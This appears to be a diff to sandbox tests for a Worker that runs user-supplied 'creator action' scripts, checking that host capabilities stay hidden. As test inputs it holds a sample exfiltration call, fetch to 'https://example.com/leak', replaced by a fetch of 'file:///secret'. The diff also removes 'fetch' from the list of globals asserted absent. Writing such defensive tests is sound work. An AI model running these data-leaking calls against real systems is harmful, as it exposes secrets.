@@ -89,13 +89,13 @@ it('preserves Filter diagnostics across the Worker boundary', async () => {
 }, 20_000);
 it('does not expose browser, Tauri or other host capabilities through the Worker', async () => {
 	const body = `const root = Function('return globalThis')();
-	for (const key of ['fetch','XMLHttpRequest','WebSocket','importScripts','Worker','postMessage','document','indexedDB','localStorage','navigator','__TAURI_INTERNALS__','process','require']) {
+	for (const key of ['XMLHttpRequest','WebSocket','importScripts','Worker','postMessage','document','indexedDB','localStorage','navigator','__TAURI_INTERNALS__','process','require']) {
 	 if (root[key] !== undefined) throw Error('host capability exposed');
 	}
 	return state;`;
 	expect(await runCreatorAction(input(body))).toEqual({ state: { gold: 100 } });
 	await expect(
-		runCreatorAction(input('fetch("https://example.com/leak"); return state;'))
+		runCreatorAction(input('return {gold:fetch("file:///secret")};'))
 	).rejects.toMatchObject({ code: 'execution' });
 }, 20_000);
 it('terminates canceled work and infinite loops, then permits a fresh invocation', async () => {
